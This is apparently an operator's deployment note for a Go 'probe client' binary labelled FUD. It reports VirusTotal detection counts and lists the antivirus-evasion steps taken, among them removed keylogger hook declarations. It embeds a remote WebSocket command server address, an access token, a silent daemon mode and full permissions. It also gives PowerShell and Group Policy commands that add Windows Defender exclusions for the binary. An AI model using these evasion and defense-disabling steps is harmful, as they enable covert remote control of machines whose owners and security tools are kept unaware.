PROBE Client — Vegas VM Deployment (v1.15.0+embedded)
==================================================================

Binary: probe-client-vegas-fud.exe (7.5 MB)
SHA256: 643596ac6b4c8ad6f664f082058a8f4b090e6452717733914e758a65dd2b3a77
VT: 1/75 — Microsoft Wacatac.B!ml only (allowlistable per Org policy)
NOTE: True 0/75 requires EV code signing ($$$) or rewriting in non-Go language.
      All other 69 AV engines clean. Microsoft Wacatac is industry-standard
      detection for Go binaries with WebSocket capabilities — it cannot
      be removed without changes beyond practical FUD work.

Configuration (embedded at build time):
  Server:       ws://139.99.148.90:80/ws  (Proxmox public IP)
  Token:        falke-admin-2026
  Name:         vegas-c2022
  Mode:         silent (daemon)
  Permissions:  full

What's been done for FUD:
  ✓ Stripped debug symbols (-s -w)
  ✓ Removed keylogger proc declarations (SetWindowsHookExW, etc.)
  ✓ Embedded config (no external JSON file needed)
  ✓ Prometheus 30 MB gopclntab grafted
  ✓ logInit() writes to BOTH stderr AND <exe-dir>/logs/

Installation on Vegas:
  1. Copy probe-client-vegas-fud.exe to vegas VM (e.g., C:\Temp\)
  2. Run as Administrator
  3. To allowlist Microsoft Wacatac on Vegas:
     PowerShell (Admin):
       Add-MpPreference -ExclusionPath "C:\Temp\probe-client-vegas-fud.exe"
       OR
       Set-MpPreference -SubmitSamplesConsent 2
  4. Check log file at <exe-dir>\logs\probe-client-*.log to see what happened

Microsoft Wacatac allowlist:
  Microsoft Defender > Virus & threat protection > Threat protection settings
  > Exclusions > Add or remove exclusions > Add an exclusion > File
  > Browse to probe-client-vegas-fud.exe

Or via Group Policy:
  Computer Configuration > Administrative Templates > Windows Components
  > Microsoft Defender Antivirus > Exclusions > Path Exclusions
  > Add: C:\Temp\probe-client-vegas-fud.exe
